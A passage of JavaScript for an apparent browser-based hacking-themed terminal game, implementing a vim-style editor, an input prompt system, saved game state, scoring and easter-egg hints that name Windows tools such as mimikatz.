    pos += lines[i].length + 1; // +1 for newline
  }
  pos += col - 1;

  textarea.selectionStart = textarea.selectionEnd = pos;
  textarea.focus();

  codeEditor.cursorLine = line;
  codeEditor.cursorCol = col;
  updateEditorStatus();
}

function updateEditorStatus() {
  const pos = getEditorCursorPos();
  document.getElementById('code-editor-status').textContent = `Ln ${pos.line}, Col ${pos.col}`;
}

function getLineContent(lineNum) {
  const textarea = document.getElementById('code-editor-content');
  const lines = textarea.value.split('\n');
  return lines[lineNum - 1] || '';
}

function getLineCount() {
  const textarea = document.getElementById('code-editor-content');
  return textarea.value.split('\n').length;
}

function saveUndoState() {
  const textarea = document.getElementById('code-editor-content');
  codeEditor.undoStack.push({
    content: textarea.value,
    cursor: textarea.selectionStart
  });
  // Limit undo stack
  if (codeEditor.undoStack.length > 100) {
    codeEditor.undoStack.shift();
  }
  codeEditor.redoStack = [];
}

function editorUndo() {
  if (codeEditor.undoStack.length === 0) return;
  const textarea = document.getElementById('code-editor-content');
  const current = { content: textarea.value, cursor: textarea.selectionStart };
  codeEditor.redoStack.push(current);

  const state = codeEditor.undoStack.pop();
  textarea.value = state.content;
  textarea.selectionStart = textarea.selectionEnd = state.cursor;
  updateEditorLineNumbers();
  updateEditorStatus();
}

function editorRedo() {
  if (codeEditor.redoStack.length === 0) return;
  const textarea = document.getElementById('code-editor-content');
  const current = { content: textarea.value, cursor: textarea.selectionStart };
  codeEditor.undoStack.push(current);

  const state = codeEditor.redoStack.pop();
  textarea.value = state.content;
  textarea.selectionStart = textarea.selectionEnd = state.cursor;
  updateEditorLineNumbers();
  updateEditorStatus();
}

// ═══════════════════════════════════════════════════════════════
// VIM EDITOR - Navigation commands
// ═══════════════════════════════════════════════════════════════
function vimMove(direction, count = 1) {
  const textarea = document.getElementById('code-editor-content');
  const pos = getEditorCursorPos();
  const lines = textarea.value.split('\n');

  for (let i = 0; i < count; i++) {
    switch (direction) {
      case 'h': // left
        if (pos.col > 1) pos.col--;
        break;
      case 'l': // right
        if (pos.col <= lines[pos.line - 1].length) pos.col++;
        break;
      case 'j': // down
        if (pos.line < lines.length) {
          pos.line++;
          pos.col = Math.min(pos.col, lines[pos.line - 1].length + 1);
        }
        break;
      case 'k': // up
        if (pos.line > 1) {
          pos.line--;
          pos.col = Math.min(pos.col, lines[pos.line - 1].length + 1);
        }
        break;
      case 'w': // word forward
        const lineW = lines[pos.line - 1];
        const afterW = lineW.slice(pos.col - 1);
        const matchW = afterW.match(/^\w*\s*\w?/);
        if (matchW && matchW[0].length > 1) {
          pos.col += matchW[0].length - 1;
        } else if (pos.line < lines.length) {
          pos.line++;
          pos.col = 1;
        }
        break;
      case 'b': // word backward
        const lineB = lines[pos.line - 1];
        const beforeB = lineB.slice(0, pos.col - 1);
        const matchB = beforeB.match(/\w+\s*$/);
        if (matchB) {
          pos.col -= matchB[0].length;
        } else if (pos.line > 1) {
          pos.line--;
          pos.col = lines[pos.line - 1].length + 1;
        }
        break;
      case '0': // start of line
        pos.col = 1;
        break;
      case '$': // end of line
        pos.col = lines[pos.line - 1].length + 1;
        break;
      case '^': // first non-whitespace
        const lineStart = lines[pos.line - 1];
        const firstChar = lineStart.search(/\S/);
        pos.col = firstChar >= 0 ? firstChar + 1 : 1;
        break;
      case 'G': // go to end
        pos.line = lines.length;
        pos.col = 1;
        break;
      case 'gg': // go to start
        pos.line = 1;
        pos.col = 1;
        break;
    }
  }

  setEditorCursorPos(pos.line, pos.col);
}

// ═══════════════════════════════════════════════════════════════
// VIM EDITOR - Editing commands
// ═══════════════════════════════════════════════════════════════
function vimDeleteLine(count = 1) {
  saveUndoState();
  const textarea = document.getElementById('code-editor-content');
  const pos = getEditorCursorPos();
  const lines = textarea.value.split('\n');

  const deleted = lines.splice(pos.line - 1, count);
  codeEditor.yankBuffer = deleted.join('\n');

  textarea.value = lines.join('\n');
  updateEditorLineNumbers();
  setEditorCursorPos(Math.min(pos.line, lines.length), 1);
}

function vimDeleteChar() {
  saveUndoState();
  const textarea = document.getElementById('code-editor-content');
  const pos = textarea.selectionStart;
  const content = textarea.value;

  if (pos < content.length) {
    codeEditor.yankBuffer = content[pos];
    textarea.value = content.slice(0, pos) + content.slice(pos + 1);
    textarea.selectionStart = textarea.selectionEnd = pos;
    updateEditorLineNumbers();
    updateEditorStatus();
  }
}

function vimYankLine(count = 1) {
  const textarea = document.getElementById('code-editor-content');
  const pos = getEditorCursorPos();
  const lines = textarea.value.split('\n');

  const yanked = lines.slice(pos.line - 1, pos.line - 1 + count);
  codeEditor.yankBuffer = yanked.join('\n');

  print(`${count} line(s) yanked`, 'info');
}

function vimPaste(before = false) {
  if (!codeEditor.yankBuffer) return;

  saveUndoState();
  const textarea = document.getElementById('code-editor-content');
  const pos = getEditorCursorPos();
  const lines = textarea.value.split('\n');

  // Check if yanked content is lines (has newlines or ends with newline behavior)
  const isLinePaste = codeEditor.yankBuffer.includes('\n') || codeEditor.lastCommand.includes('d') || codeEditor.lastCommand.includes('y');

  if (isLinePaste) {
    const insertLine = before ? pos.line - 1 : pos.line;
    lines.splice(insertLine, 0, codeEditor.yankBuffer);
    textarea.value = lines.join('\n');
    setEditorCursorPos(insertLine + 1, 1);
  } else {
    const insertPos = before ? textarea.selectionStart : textarea.selectionStart + 1;
    textarea.value = textarea.value.slice(0, insertPos) + codeEditor.yankBuffer + textarea.value.slice(insertPos);
    textarea.selectionStart = textarea.selectionEnd = insertPos + codeEditor.yankBuffer.length;
    updateEditorStatus();
  }

  updateEditorLineNumbers();
}

function vimJoinLines() {
  saveUndoState();
  const textarea = document.getElementById('code-editor-content');
  const pos = getEditorCursorPos();
  const lines = textarea.value.split('\n');

  if (pos.line < lines.length) {
    const currentLine = lines[pos.line - 1];
    const nextLine = lines[pos.line].trimStart();
    lines[pos.line - 1] = currentLine + ' ' + nextLine;
    lines.splice(pos.line, 1);
    textarea.value = lines.join('\n');
    setEditorCursorPos(pos.line, currentLine.length + 1);
    updateEditorLineNumbers();
  }
}

// ═══════════════════════════════════════════════════════════════
// VIM EDITOR - Search
// ═══════════════════════════════════════════════════════════════
function vimSearch(query, forward = true) {
  const textarea = document.getElementById('code-editor-content');
  const content = textarea.value;
  codeEditor.searchQuery = query;
  codeEditor.searchResults = [];

  if (!query) return;

  let match;
  const regex = new RegExp(query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'gi');
  while ((match = regex.exec(content)) !== null) {
    codeEditor.searchResults.push(match.index);
  }

  if (codeEditor.searchResults.length === 0) {
    print(`Pattern not found: ${query}`, 'error');
    return;
  }

  // Find next match from cursor
  const cursorPos = textarea.selectionStart;
  let targetIndex = forward
    ? codeEditor.searchResults.find(pos => pos > cursorPos)
    : [...codeEditor.searchResults].reverse().find(pos => pos < cursorPos);

  if (targetIndex === undefined) {
    targetIndex = forward ? codeEditor.searchResults[0] : codeEditor.searchResults[codeEditor.searchResults.length - 1];
    print(`Search wrapped`, 'info');
  }

  textarea.selectionStart = textarea.selectionEnd = targetIndex;
  textarea.focus();
  updateEditorStatus();
}

function vimSearchNext(forward = true) {
  if (!codeEditor.searchQuery) return;
  vimSearch(codeEditor.searchQuery, forward);
}

// ═══════════════════════════════════════════════════════════════
// VIM EDITOR - Additional motions (f, t, c, text objects)
// ═══════════════════════════════════════════════════════════════
function vimFindChar(char, forward = true, tillChar = false) {
  const textarea = document.getElementById('code-editor-content');
  const pos = getEditorCursorPos();
  const lines = textarea.value.split('\n');
  const line = lines[pos.line - 1];

  if (forward) {
    const searchStart = pos.col;
    const index = line.indexOf(char, searchStart);
    if (index !== -1) {
      const newCol = tillChar ? index : index + 1;
      setEditorCursorPos(pos.line, newCol);
      codeEditor.lastFindChar = { char, forward, tillChar };
    }
  } else {
    const searchEnd = pos.col - 2;
    const index = line.lastIndexOf(char, searchEnd);
    if (index !== -1) {
      const newCol = tillChar ? index + 2 : index + 1;
      setEditorCursorPos(pos.line, newCol);
      codeEditor.lastFindChar = { char, forward, tillChar };
    }
  }
}

function vimRepeatFindChar(reverse = false) {
  if (!codeEditor.lastFindChar) return;
  const { char, forward, tillChar } = codeEditor.lastFindChar;
  vimFindChar(char, reverse ? !forward : forward, tillChar);
}

function vimChange(motion, count) {
  switch (motion) {
    case 'w':
      // Change word
      saveUndoState();
      const taCW = document.getElementById('code-editor-content');
      const startCW = taCW.selectionStart;
      const contentCW = taCW.value;
      const afterCW = contentCW.slice(startCW);
      const wordMatchCW = afterCW.match(/^\w+/);
      if (wordMatchCW) {
        codeEditor.yankBuffer = wordMatchCW[0];
        taCW.value = contentCW.slice(0, startCW) + contentCW.slice(startCW + wordMatchCW[0].length);
        taCW.selectionStart = taCW.selectionEnd = startCW;
        setEditorMode('insert');
        updateEditorLineNumbers();
      }
      break;
    case 'c':
      // Change line (cc)
      saveUndoState();
      const taCC = document.getElementById('code-editor-content');
      const posCC = getEditorCursorPos();
      const linesCC = taCC.value.split('\n');
      codeEditor.yankBuffer = linesCC[posCC.line - 1];
      linesCC[posCC.line - 1] = '';
      taCC.value = linesCC.join('\n');
      setEditorCursorPos(posCC.line, 1);
      setEditorMode('insert');
      updateEditorLineNumbers();
      break;
    case '$':
      // Change to end of line
      saveUndoState();
      const taC$ = document.getElementById('code-editor-content');
      const posC$ = getEditorCursorPos();
      const linesC$ = taC$.value.split('\n');
      const lineC$ = linesC$[posC$.line - 1];
      codeEditor.yankBuffer = lineC$.slice(posC$.col - 1);
      linesC$[posC$.line - 1] = lineC$.slice(0, posC$.col - 1);
      taC$.value = linesC$.join('\n');
      setEditorMode('insert');
      updateEditorLineNumbers();
      break;
    case 'i':
    case 'a':
      // ci/ca - need another char for text object
      codeEditor.pendingKey = 'c' + motion;
      break;
    default:
      break;
  }
}

function vimTextObject(operation, modifier, object) {
  // operation: 'd' (delete), 'c' (change), 'y' (yank)
  // modifier: 'i' (inner), 'a' (around)
  // object: 'w' (word), '"', "'", '(', ')', '{', '}', '[', ']', '<', '>', 'b' (block), 'B' (Block)

  const textarea = document.getElementById('code-editor-content');
  const pos = textarea.selectionStart;
  const content = textarea.value;
  let start, end;

  switch (object) {
    case 'w': // word
      // Find word boundaries
      let wordStart = pos;
      let wordEnd = pos;
      while (wordStart > 0 && /\w/.test(content[wordStart - 1])) wordStart--;
      while (wordEnd < content.length && /\w/.test(content[wordEnd])) wordEnd++;
      if (modifier === 'a') {
        // Include trailing whitespace
        while (wordEnd < content.length && /\s/.test(content[wordEnd])) wordEnd++;
      }
      start = wordStart;
      end = wordEnd;
      break;

    case '"':
    case "'":
    case '`':
      // String text object
      const lineStart = content.lastIndexOf('\n', pos - 1) + 1;
      const lineEnd = content.indexOf('\n', pos);
      const line = content.slice(lineStart, lineEnd === -1 ? undefined : lineEnd);
      const relPos = pos - lineStart;

      // Find matching quotes
      let quoteStart = line.lastIndexOf(object, relPos);
      let quoteEnd = line.indexOf(object, relPos);

      if (quoteStart === -1 || quoteEnd === -1 || quoteStart >= quoteEnd) {
        // Try to find quote pair differently
        quoteStart = line.indexOf(object);
        quoteEnd = line.indexOf(object, quoteStart + 1);
      }

      if (quoteStart !== -1 && quoteEnd !== -1 && quoteStart < quoteEnd) {
        start = lineStart + quoteStart + (modifier === 'i' ? 1 : 0);
        end = lineStart + quoteEnd + (modifier === 'a' ? 1 : 0);
      } else {
        return; // No matching quotes found
      }
      break;

    case '(':
    case ')':
    case 'b': // block
      findMatchingPair('(', ')');
      break;

    case '{':
    case '}':
    case 'B': // Block
      findMatchingPair('{', '}');
      break;

    case '[':
    case ']':
      findMatchingPair('[', ']');
      break;

    case '<':
    case '>':
      findMatchingPair('<', '>');
      break;

    default:
      return;
  }

  function findMatchingPair(openChar, closeChar) {
    let depth = 0;
    let pairStart = -1;
    let pairEnd = -1;

    // Find opening bracket
    for (let i = pos; i >= 0; i--) {
      if (content[i] === closeChar) depth++;
      if (content[i] === openChar) {
        if (depth === 0) {
          pairStart = i;
          break;
        }
        depth--;
      }
    }

    // Find closing bracket
    depth = 0;
    for (let i = pos; i < content.length; i++) {
      if (content[i] === openChar) depth++;
      if (content[i] === closeChar) {
        if (depth === 0) {
          pairEnd = i;
          break;
        }
        depth--;
      }
    }

    if (pairStart !== -1 && pairEnd !== -1) {
      start = pairStart + (modifier === 'i' ? 1 : 0);
      end = pairEnd + (modifier === 'a' ? 1 : 0);
    }
  }

  if (start === undefined || end === undefined) return;

  const selectedText = content.slice(start, end);

  switch (operation) {
    case 'd':
      saveUndoState();
      codeEditor.yankBuffer = selectedText;
      textarea.value = content.slice(0, start) + content.slice(end);
      textarea.selectionStart = textarea.selectionEnd = start;
      updateEditorLineNumbers();
      updateEditorStatus();
      break;
    case 'c':
      saveUndoState();
      codeEditor.yankBuffer = selectedText;
      textarea.value = content.slice(0, start) + content.slice(end);
      textarea.selectionStart = textarea.selectionEnd = start;
      setEditorMode('insert');
      updateEditorLineNumbers();
      break;
    case 'y':
      codeEditor.yankBuffer = selectedText;
      print(`Yanked: ${selectedText.length} characters`, 'info');
      break;
  }
}

// ═══════════════════════════════════════════════════════════════
// VIM EDITOR - Main keyboard handler
// ═══════════════════════════════════════════════════════════════
document.addEventListener('keydown', (e) => {
  if (!codeEditor.isOpen) return;

  // ─── NORMAL MODE ───────────────────────────────────────────
  if (codeEditor.mode === 'normal') {
    const key = e.key;

    // Check for number prefix (repeat count)
    if (/^[1-9]$/.test(key) && !codeEditor.pendingKey) {
      codeEditor.repeatCount = codeEditor.repeatCount * 10 + parseInt(key);
      e.preventDefault();
      return;
    }
    if (key === '0' && codeEditor.repeatCount > 0) {
      codeEditor.repeatCount = codeEditor.repeatCount * 10;
      e.preventDefault();
      return;
    }

    const count = codeEditor.repeatCount || 1;

    // Handle multi-key commands
    if (codeEditor.pendingKey) {
      const pending = codeEditor.pendingKey;
      const combo = pending + key;
      e.preventDefault();

      // Handle f/F/t/T + character
      if (pending === 'f' || pending === 'F' || pending === 't' || pending === 'T') {
        codeEditor.pendingKey = '';
        codeEditor.repeatCount = 0;
        vimFindChar(key, pending === 'f' || pending === 't', pending === 't' || pending === 'T');
        return;
      }

      // Handle c + motion (change)
      if (pending === 'c') {
        codeEditor.pendingKey = '';
        codeEditor.repeatCount = 0;
        vimChange(key, count);
        return;
      }

      // Handle ci/di/yi + text object
      if (pending === 'ci' || pending === 'di' || pending === 'yi') {
        codeEditor.pendingKey = '';
        codeEditor.repeatCount = 0;
        vimTextObject(pending[0], 'i', key);
        return;
      }

      // Handle ca/da/ya + text object
      if (pending === 'ca' || pending === 'da' || pending === 'ya') {
        codeEditor.pendingKey = '';
        codeEditor.repeatCount = 0;
        vimTextObject(pending[0], 'a', key);
        return;
      }

      // Two-char combos that need a third char
      if (combo === 'ci' || combo === 'di' || combo === 'yi' ||
          combo === 'ca' || combo === 'da' || combo === 'ya') {
        codeEditor.pendingKey = combo;
        return;
      }

      codeEditor.pendingKey = '';
      codeEditor.repeatCount = 0;

      switch (combo) {
        case 'gg':
          vimMove('gg');
          break;
        case 'dd':
          vimDeleteLine(count);
          codeEditor.lastCommand = 'dd';
          break;
        case 'yy':
          vimYankLine(count);
          codeEditor.lastCommand = 'yy';
          break;
        case 'cc':
          // Change entire line
          saveUndoState();
          const taCC = document.getElementById('code-editor-content');
          const posCC = getEditorCursorPos();
          const linesCC = taCC.value.split('\n');
          codeEditor.yankBuffer = linesCC[posCC.line - 1];
          linesCC[posCC.line - 1] = '';
          taCC.value = linesCC.join('\n');
          setEditorCursorPos(posCC.line, 1);
          setEditorMode('insert');
          updateEditorLineNumbers();
          break;
        case 'dw':
          // Delete word
          saveUndoState();
          const ta = document.getElementById('code-editor-content');
          const start = ta.selectionStart;
          const content = ta.value;
          const afterCursor = content.slice(start);
          const wordMatch = afterCursor.match(/^\w+\s*|\W+/);
          if (wordMatch) {
            codeEditor.yankBuffer = wordMatch[0];
            ta.value = content.slice(0, start) + content.slice(start + wordMatch[0].length);
            ta.selectionStart = ta.selectionEnd = start;
            updateEditorLineNumbers();
          }
          break;
        case 'd$':
        case 'D':
          // Delete to end of line
          saveUndoState();
          const taD = document.getElementById('code-editor-content');
          const posD = getEditorCursorPos();
          const linesD = taD.value.split('\n');
          const lineD = linesD[posD.line - 1];
          codeEditor.yankBuffer = lineD.slice(posD.col - 1);
          linesD[posD.line - 1] = lineD.slice(0, posD.col - 1);
          taD.value = linesD.join('\n');
          updateEditorLineNumbers();
          updateEditorStatus();
          break;
        case 'd0':
          // Delete to start of line
          saveUndoState();
          const taD0 = document.getElementById('code-editor-content');
          const posD0 = getEditorCursorPos();
          const linesD0 = taD0.value.split('\n');
          const lineD0 = linesD0[posD0.line - 1];
          codeEditor.yankBuffer = lineD0.slice(0, posD0.col - 1);
          linesD0[posD0.line - 1] = lineD0.slice(posD0.col - 1);
          taD0.value = linesD0.join('\n');
          setEditorCursorPos(posD0.line, 1);
          updateEditorLineNumbers();
          break;
        case 'cw':
          // Change word
          saveUndoState();
          const taCW = document.getElementById('code-editor-content');
          const startCW = taCW.selectionStart;
          const contentCW = taCW.value;
          const afterCW = contentCW.slice(startCW);
          const wordMatchCW = afterCW.match(/^\w+/);
          if (wordMatchCW) {
            codeEditor.yankBuffer = wordMatchCW[0];
            taCW.value = contentCW.slice(0, startCW) + contentCW.slice(startCW + wordMatchCW[0].length);
            taCW.selectionStart = taCW.selectionEnd = startCW;
            setEditorMode('insert');
            updateEditorLineNumbers();
          }
          break;
        case 'yw':
          // Yank word
          const taYW = document.getElementById('code-editor-content');
          const startYW = taYW.selectionStart;
          const afterYW = taYW.value.slice(startYW);
          const wordMatchYW = afterYW.match(/^\w+\s*/);
          if (wordMatchYW) {
            codeEditor.yankBuffer = wordMatchYW[0];
            print('Word yanked', 'info');
          }
          break;
        case 'y$':
          // Yank to end of line
          const taY$ = document.getElementById('code-editor-content');
          const posY$ = getEditorCursorPos();
          const linesY$ = taY$.value.split('\n');
          codeEditor.yankBuffer = linesY$[posY$.line - 1].slice(posY$.col - 1);
          print('Yanked to end of line', 'info');
          break;
        case 'gd':
          // Go to definition (simulated - search for function/variable definition)
          const taGD = document.getElementById('code-editor-content');
          const posGD = getEditorCursorPos();
          const linesGD = taGD.value.split('\n');
          const lineGD = linesGD[posGD.line - 1];
          const wordAtCursor = lineGD.slice(posGD.col - 1).match(/^\w+/);
          if (wordAtCursor) {
            vimSearch(`(function|def|int|void|char|struct)\\s+${wordAtCursor[0]}`, true);
          }
          break;
        default:
          // Unknown combo
          break;
      }
      return;
    }

    // Single key commands
    switch (key) {
      // Movement
      case 'h':
      case 'ArrowLeft':
        e.preventDefault();
        vimMove('h', count);
        break;
      case 'j':
      case 'ArrowDown':
        e.preventDefault();
        vimMove('j', count);
        break;
      case 'k':
      case 'ArrowUp':
        e.preventDefault();
        vimMove('k', count);
        break;
      case 'l':
      case 'ArrowRight':
        e.preventDefault();
        vimMove('l', count);
        break;
      case 'w':
        e.preventDefault();
        vimMove('w', count);
        break;
      case 'b':
        e.preventDefault();
        vimMove('b', count);
        break;
      case '0':
        e.preventDefault();
        vimMove('0');
        break;
      case '$':
        e.preventDefault();
        vimMove('$');
        break;
      case '^':
        e.preventDefault();
        vimMove('^');
        break;
      case 'G':
        e.preventDefault();
        if (count > 1) {
          setEditorCursorPos(count, 1);
        } else {
          vimMove('G');
        }
        break;
      case 'g':
        codeEditor.pendingKey = 'g';
        e.preventDefault();
        break;

      // Find character motions
      case 'f':
        codeEditor.pendingKey = 'f';
        e.preventDefault();
        break;
      case 'F':
        codeEditor.pendingKey = 'F';
        e.preventDefault();
        break;
      case 't':
        codeEditor.pendingKey = 't';
        e.preventDefault();
        break;
      case 'T':
        codeEditor.pendingKey = 'T';
        e.preventDefault();
        break;
      case ';':
        // Repeat last find
        e.preventDefault();
        vimRepeatFindChar(false);
        break;
      case ',':
        // Repeat last find in reverse
        e.preventDefault();
        vimRepeatFindChar(true);
        break;

      // Mode switching
      case 'i':
        e.preventDefault();
        setEditorMode('insert');
        break;
      case 'I':
        e.preventDefault();
        vimMove('^');
        setEditorMode('insert');
        break;
      case 'a':
        e.preventDefault();
        vimMove('l');
        setEditorMode('insert');
        break;
      case 'A':
        e.preventDefault();
        vimMove('$');
        setEditorMode('insert');
        break;
      case 'o':
        e.preventDefault();
        saveUndoState();
        const taO = document.getElementById('code-editor-content');
        const posO = getEditorCursorPos();
        const linesO = taO.value.split('\n');
        linesO.splice(posO.line, 0, '');
        taO.value = linesO.join('\n');
        setEditorCursorPos(posO.line + 1, 1);
        setEditorMode('insert');
        updateEditorLineNumbers();
        break;
      case 'O':
        e.preventDefault();
        saveUndoState();
        const taOO = document.getElementById('code-editor-content');
        const posOO = getEditorCursorPos();
        const linesOO = taOO.value.split('\n');
        linesOO.splice(posOO.line - 1, 0, '');
        taOO.value = linesOO.join('\n');
        setEditorCursorPos(posOO.line, 1);
        setEditorMode('insert');
        updateEditorLineNumbers();
        break;

      // Visual mode
      case 'v':
        e.preventDefault();
        setEditorMode('visual');
        break;
      case 'V':
        e.preventDefault();
        setEditorMode('visualLine');
        break;

      // Editing
      case 'c':
        codeEditor.pendingKey = 'c';
        e.preventDefault();
        break;
      case 'C':
        // Change to end of line
        e.preventDefault();
        vimChange('$', count);
        break;
      case 'd':
        codeEditor.pendingKey = 'd';
        e.preventDefault();
        break;
      case 'D':
        // Delete to end of line
        e.preventDefault();
        saveUndoState();
        const taD = document.getElementById('code-editor-content');
        const posD = getEditorCursorPos();
        const linesD = taD.value.split('\n');
        const lineD = linesD[posD.line - 1];
        codeEditor.yankBuffer = lineD.slice(posD.col - 1);
        linesD[posD.line - 1] = lineD.slice(0, posD.col - 1);
        taD.value = linesD.join('\n');
        updateEditorLineNumbers();
        updateEditorStatus();
        break;
      case 'y':
        codeEditor.pendingKey = 'y';
        e.preventDefault();
        break;
      case 'Y':
        // Yank entire line
        e.preventDefault();
        vimYankLine(count);
        break;
      case 's':
        // Substitute char (delete and enter insert mode)
        e.preventDefault();
        saveUndoState();
        vimDeleteChar();
        setEditorMode('insert');
        break;
      case 'S':
        // Substitute line
        e.preventDefault();
        saveUndoState();
        const taS = document.getElementById('code-editor-content');
        const posS = getEditorCursorPos();
        const linesS = taS.value.split('\n');
        codeEditor.yankBuffer = linesS[posS.line - 1];
        linesS[posS.line - 1] = '';
        taS.value = linesS.join('\n');
        setEditorCursorPos(posS.line, 1);
        setEditorMode('insert');
        updateEditorLineNumbers();
        break;
      case 'r':
        if (!e.ctrlKey) {
          // Replace char (wait for next char)
          codeEditor.pendingKey = 'r';
          e.preventDefault();
        }
        break;
      case 'R':
        // Replace mode
        e.preventDefault();
        setEditorMode('replace');
        break;
      case 'x':
        e.preventDefault();
        vimDeleteChar();
        break;
      case 'p':
        e.preventDefault();
        vimPaste(false);
        break;
      case 'P':
        e.preventDefault();
        vimPaste(true);
        break;
      case 'u':
        e.preventDefault();
        editorUndo();
        break;
      case 'r':
        if (e.ctrlKey) {
          e.preventDefault();
          editorRedo();
        }
        break;
      case 'J':
        e.preventDefault();
        vimJoinLines();
        break;

      // Search
      case '/':
        e.preventDefault();
        setEditorMode('search');
        break;
      case 'n':
        e.preventDefault();
        vimSearchNext(true);
        break;
      case 'N':
        e.preventDefault();
        vimSearchNext(false);
        break;

      // Command mode
      case ':':
        e.preventDefault();
        setEditorMode('command');
        break;

      case 'Escape':
        codeEditor.pendingKey = '';
        codeEditor.repeatCount = 0;
        break;
    }

    codeEditor.repeatCount = 0;

  // ─── INSERT MODE ───────────────────────────────────────────
  } else if (codeEditor.mode === 'insert') {
    if (e.key === 'Escape') {
      e.preventDefault();
      setEditorMode('normal');
      // Move cursor back one position like vim
      const ta = document.getElementById('code-editor-content');
      if (ta.selectionStart > 0) {
        ta.selectionStart = ta.selectionEnd = ta.selectionStart - 1;
      }
      updateEditorStatus();
    }
    // Save undo state on significant changes
    if (e.key === 'Enter' || e.key === ' ' || e.key === 'Backspace') {
      saveUndoState();
    }
    // Update line numbers on input
    setTimeout(updateEditorLineNumbers, 0);
    setTimeout(updateEditorStatus, 0);

  // ─── COMMAND MODE ───────────────────────────────────────────
  } else if (codeEditor.mode === 'command') {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleEditorCommand(document.getElementById('code-editor-cmd-input').value);
    } else if (e.key === 'Escape') {
      e.preventDefault();
      setEditorMode('normal');
    }

  // ─── SEARCH MODE ───────────────────────────────────────────
  } else if (codeEditor.mode === 'search') {
    if (e.key === 'Enter') {
      e.preventDefault();
      const query = document.getElementById('code-editor-cmd-input').value.slice(1); // Remove /
      vimSearch(query, true);
      setEditorMode('normal');
    } else if (e.key === 'Escape') {
      e.preventDefault();
      setEditorMode('normal');
    }
  }
});

// Update editor status on cursor move
document.getElementById('code-editor-content')?.addEventListener('click', function() {
  updateEditorStatus();
});

// Also track input changes for line numbers
document.getElementById('code-editor-content')?.addEventListener('input', function() {
  updateEditorLineNumbers();
  updateEditorStatus();
});

// ============================================
// STDIN INPUT SYSTEM (for interactive commands)
// ============================================
const stdinState = {
  active: false,
  prompt: '',
  callback: null,
  isPassword: false
};

function requestStdin(prompt, callback, isPassword = false) {
  stdinState.active = true;
  stdinState.prompt = prompt;
  stdinState.callback = callback;
  stdinState.isPassword = isPassword;

  document.getElementById('prompt').textContent = prompt;
  const input = document.getElementById('terminal-input');
  input.type = isPassword ? 'password' : 'text';
  input.value = '';
  input.focus();
}

function handleStdinInput(value) {
  const callback = stdinState.callback;
  stdinState.active = false;
  stdinState.callback = null;

  document.getElementById('terminal-input').type = 'text';

  if (callback) {
    callback(value);
  }
}

// ============================================
// GAME STATE
// ============================================
const gameState = {
  currentLevel: 0,
  levelsCompleted: [],
  inLevel: false,
  levelState: {},
  commandHistory: [],
  historyIndex: -1,
  hackerName: '',
  attempts: 0,
  needsName: true,
  score: 0,
  easterEggsFound: []
};

// Load saved state
function loadGame() {
  const saved = localStorage.getItem('hackerGame');
  if (saved) {
    const data = JSON.parse(saved);
    gameState.levelsCompleted = data.levelsCompleted || [];
    gameState.currentLevel = data.currentLevel || 0;
    gameState.levelState = data.levelState || {};
    gameState.inLevel = data.inLevel || false;
    gameState.hackerName = data.hackerName || '';
    gameState.attempts = data.attempts || 0;
    gameState.needsName = !data.hackerName;
    gameState.score = data.score || 0;
    gameState.easterEggsFound = data.easterEggsFound || [];
  }
}

function saveGame() {
  localStorage.setItem('hackerGame', JSON.stringify({
    levelsCompleted: gameState.levelsCompleted,
    currentLevel: gameState.currentLevel,
    levelState: gameState.levelState,
    inLevel: gameState.inLevel,
    hackerName: gameState.hackerName,
    attempts: gameState.attempts,
    score: gameState.score,
    easterEggsFound: gameState.easterEggsFound
  }));
}

// Autosave on state change - call this after important progress
function autosave() {
  saveGame();
  // Silent autosave - don't spam the terminal
}

// ============================================
// SCORING SYSTEM
// ============================================
const SCORE_VALUES = {
  LEVEL_COMPLETE: 1000,      // Per level
  EASTER_EGG: 500,           // Per easter egg
  EFFICIENCY_BONUS: 100,     // Low attempts bonus
  PROGRESS_POINT: 50         // Per progress step
};

function calculateScore() {
  let score = 0;

  // Level completion bonus
  score += gameState.levelsCompleted.length * SCORE_VALUES.LEVEL_COMPLETE;

  // Easter eggs bonus
  score += gameState.easterEggsFound.length * SCORE_VALUES.EASTER_EGG;

  // Efficiency bonus (fewer attempts = higher score)
  const avgAttempts = gameState.attempts / Math.max(gameState.levelsCompleted.length, 1);
  if (avgAttempts < 2) score += 500;
  else if (avgAttempts < 3) score += 300;
  else if (avgAttempts < 5) score += 100;

  // Current level progress
  const progressSteps = Object.values(gameState.levelState).filter(v => v === true).length;
  score += progressSteps * SCORE_VALUES.PROGRESS_POINT;

  gameState.score = score;
  return score;
}

function addEasterEgg(eggId, message) {
  if (gameState.easterEggsFound.includes(eggId)) {
    return false; // Already found
  }
  gameState.easterEggsFound.push(eggId);
  gameState.score += SCORE_VALUES.EASTER_EGG;
  playSuccess();
  print('');
  print(ASCII.ohio, 'ascii');
  print(`[EASTER EGG FOUND] ${message}`, 'success');
  print(`+${SCORE_VALUES.EASTER_EGG} points!`, 'highlight');
  print('');
  autosave();
  return true;
}

// ============================================
// STATS DISPLAY
// ============================================
const EASTER_EGG_NAMES = {
  'lvl1_whoami': { level: 1, hint: 'Who are you?' },
  'lvl2_mimikatz': { level: 2, hint: 'The cat that steals passwords...' },
  'lvl3_netuser': { level: 3, hint: 'Old school Windows enumeration' },
  'lvl4_tasklist': { level: 4, hint: 'Know your enemy processes' },
  'lvl5_windbg': { level: 5, hint: 'Kernel debugging commands' },
  'lvl6_godsays': { level: 6, hint: 'Ask the oracle...' },
  'secret_matrix': { level: 0, hint: 'Follow the white rabbit...' }
};

function showStats() {
  calculateScore();

  print('');
  print('╔═══════════════════════════════════════════════════════════╗', 'info');
  print('║                    YOUR HACKER STATS                      ║', 'info');
  print('╠═══════════════════════════════════════════════════════════╣', 'info');
  print(`║  Hacker: ${gameState.hackerName.padEnd(44)} ║`, 'success');
  print('╠═══════════════════════════════════════════════════════════╣', 'info');
  print(`║  Score: ${String(gameState.score).padStart(6)}                                          ║`, 'highlight');
  print(`║  Levels Completed: ${gameState.levelsCompleted.length}/6                                  ║`, 'system');

  // Progress bar
  const progress = Math.round((gameState.levelsCompleted.length / 6) * 100);
  const barFill = Math.floor(progress / 5);
  const progressBar = '█'.repeat(barFill) + '░'.repeat(20 - barFill);
  print(`║  Progress: [${progressBar}] ${String(progress).padStart(3)}%     ║`, progress === 100 ? 'success' : 'system');

  print(`║  Easter Eggs Found: ${gameState.easterEggsFound.length}/7                                 ║`, gameState.easterEggsFound.length > 0 ? 'success' : 'system');
  print(`║  Total Attempts: ${String(gameState.attempts).padStart(4)}                                ║`, 'system');
  print('╠═══════════════════════════════════════════════════════════╣', 'info');

  // Show level progress
